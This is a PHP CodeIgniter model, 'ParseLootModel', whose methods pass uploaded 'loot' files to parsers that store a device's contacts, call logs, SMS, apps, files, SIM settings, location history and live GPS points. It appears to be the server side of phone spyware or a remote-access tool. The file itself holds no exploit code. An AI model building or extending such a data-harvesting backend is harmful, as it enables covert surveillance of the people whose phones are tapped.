<?php

namespace App\Models;

use CodeIgniter\Model;
use App\Libraries\Parsers\LootCommsParser;
use App\Libraries\Parsers\LootSystemParser;
use App\Libraries\Parsers\LootLocationParser;

class ParseLootModel extends Model
{
    /**
     * Parses and inserts contacts from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function get_contacts(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        return (new LootCommsParser($this->db))->parseContacts($file_name, $var_file_owner, $var_file_print, $fileRecordId);
    }

    /**
     * Parses and inserts call logs from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @return bool|int
     */
    public function get_logs(string $file_name, int $var_file_owner, string $var_file_print)
    {
        return (new LootCommsParser($this->db))->parseCallLogs($file_name, $var_file_owner, $var_file_print);
    }

    /**
     * Parses and inserts apps from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function get_apps(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        return (new LootSystemParser($this->db))->parseApps($file_name, $var_file_owner, $var_file_print, $fileRecordId);
    }

    /**
     * Parses and inserts SMS from file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function get_sms(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        return (new LootCommsParser($this->db))->parseSms($file_name, $var_file_owner, $var_file_print, $fileRecordId);
    }

    /**
     * Parses and inserts device files from modern JSON file (with batch insert).
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function get_files(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        return (new LootSystemParser($this->db))->parseFiles($file_name, $var_file_owner, $var_file_print, $fileRecordId);
    }

    /**
     * Parses and inserts location and activity data from modern JSON file.
     *
     * @param string $file_name
     * @param int $var_file_owner
     * @param string $var_file_print
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function get_location(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
    {
        return (new LootLocationParser($this->db))->parseLocation($file_name, $var_file_owner, $var_file_print, $fileRecordId);
    }

    /**
     * Parses and inserts SIM configs.
     *
     * @param string $file_name
     * @param int $ownerId
     * @param string $devicePrint
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function parse_sim_configs(string $file_name, int $ownerId, string $devicePrint, int $fileRecordId = null)
    {
        return (new LootSystemParser($this->db))->parseSimConfigs($file_name, $ownerId, $devicePrint, $fileRecordId);
    }

    /**
     * Parses and inserts live locations (batch GPS points).
     *
     * @param string $file_name
     * @param int $ownerId
     * @param string $devicePrint
     * @param int|null $fileRecordId
     * @return bool|int
     */
    public function parse_live_locations(string $file_name, int $ownerId, string $devicePrint, int $fileRecordId = null)
    {
        return (new LootLocationParser($this->db))->parseLiveLocations($file_name, $ownerId, $devicePrint, $fileRecordId);
    }
}